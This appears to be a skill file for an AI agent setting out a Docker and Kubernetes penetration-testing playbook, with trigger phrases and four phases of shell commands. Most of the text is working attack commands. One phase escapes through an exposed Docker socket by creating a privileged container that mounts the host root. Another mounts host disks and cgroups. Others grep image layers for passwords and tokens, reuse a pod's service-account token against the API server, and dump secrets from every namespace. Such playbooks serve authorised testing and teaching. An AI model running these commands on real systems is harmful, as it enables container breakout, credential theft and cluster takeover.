---
name: tech-docker
description: "Docker and container security testing — privileged container escape, docker socket abuse, container breakout, image secret scanning, registry credentials, Kubernetes misconfiguration. Triggers: 'docker security', 'container escape', 'docker breakout', 'privileged container', 'docker socket', 'container pentest', 'kubernetes security', 'k8s pentest', 'docker misconfiguration'."
---

# Docker / Container Security Testing

Test container isolation, socket exposure, and privilege escalation.

---

## Phase 1: Container Enumeration

```bash
# Check if inside a container:
cat /proc/1/cgroup | grep -i "docker\|lxc\|kubepods"
ls /.dockerenv 2>/dev/null && echo "Inside Docker container"
env | grep -iE "KUBERNETES|K8S|DOCKER|CONTAINER"

# Available capabilities:
capsh --print 2>/dev/null | grep "Current:"
cat /proc/self/status | grep "CapPrm\|CapEff\|CapBnd"

# Check privileged:
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED (created interface)"
```

---

## Phase 2: Container Escape Techniques

```bash
# 1. Docker socket escape (if /var/run/docker.sock accessible):
ls -la /var/run/docker.sock 2>/dev/null
curl --unix-socket /var/run/docker.sock "http://localhost/containers/json" | jq '.[].Names'

# Create privileged container mounting host:
curl --unix-socket /var/run/docker.sock -X POST \
  "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Binds":["/:/host"],"Privileged":true,"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'

# 2. Privileged mode escape:
# Mount host filesystem:
mkdir /tmp/host
mount /dev/sda1 /tmp/host 2>/dev/null
# Or via cgroup:
mkdir /tmp/cgroup
mount -t cgroup -o memory cgroup /tmp/cgroup 2>/dev/null

# 3. SYS_PTRACE capability:
# Inject into host process via ptrace
# 4. SYS_ADMIN capability:
# Mount /proc, use nsenter
```

---

## Phase 3: Registry & Image Secrets

```bash
TARGET_REGISTRY="registry.target.com"

# Unauthenticated registry access:
curl -s "https://$TARGET_REGISTRY/v2/_catalog" | jq .
curl -s "https://$TARGET_REGISTRY/v2/IMAGE/tags/list" | jq .

# Download and inspect layers:
docker pull "$TARGET_REGISTRY/image:latest" 2>/dev/null
docker history "$TARGET_REGISTRY/image:latest" --no-trunc 2>/dev/null | tee output/docker_history.txt

# Scan for secrets in image:
docker save "$TARGET_REGISTRY/image:latest" | tar -xO | strings | \
  grep -iE '(password|secret|key|token|aws_|api_key)' | tee output/docker_secrets.txt

# Trivy scan:
trivy image "$TARGET_REGISTRY/image:latest" --severity HIGH,CRITICAL 2>/dev/null | tee output/trivy_scan.txt
```

---

## Phase 4: Kubernetes Misconfiguration

```bash
K8S_API="https://K8S_API_SERVER"

# Unauthenticated K8s API:
curl -sk "$K8S_API/api/v1/namespaces" | jq '.items[].metadata.name'
curl -sk "$K8S_API/api/v1/pods" | jq '.items[].metadata.name'

# From inside pod — service account token:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
curl -sk --header "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" | jq '.items[].metadata.name'

# Check RBAC permissions:
kubectl auth can-i --list 2>/dev/null | tee output/k8s_permissions.txt

# Find secrets:
kubectl get secrets --all-namespaces -o yaml 2>/dev/null | grep -A5 "stringData\|data:" | tee output/k8s_secrets.txt
```

---

## Output

Save to `output/`:
- `docker_secrets.txt` — secrets found in image
- `trivy_scan.txt` — CVE scan of container images
- `k8s_permissions.txt` — Kubernetes RBAC permissions

## Next Phase

→ `post-linux-privesc` after container escape
→ `vuln-info-disclosure` for registry secrets exposure
